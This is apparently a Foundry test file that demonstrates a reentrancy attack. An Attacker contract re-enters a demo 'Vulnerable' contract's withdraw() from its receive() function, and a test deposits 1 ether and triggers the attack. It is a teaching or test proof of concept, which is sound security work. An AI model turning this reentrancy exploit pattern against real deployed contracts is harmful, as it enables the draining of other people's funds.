// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../contracts/ReentrancyDemo.sol";

contract Attacker {
    Vulnerable public target;
    bool public isAttacking;

    constructor(address _target) {
        target = Vulnerable(_target);
    }

    function attack() external {
        isAttacking = true;
        target.withdraw();
        isAttacking = false;
    }

    receive() external payable {
        if (isAttacking) {
            target.withdraw();
        }
    }
}

contract ReentrancyTest is Test {
    Vulnerable public vulnerable;
    Attacker public attacker;

    function setUp() public {
        vulnerable = new Vulnerable();
        attacker = new Attacker(address(vulnerable));
    }

    function testReentrancy() public {
        vulnerable.deposit{value: 1 ether}();
        attacker.attack();
    }
}
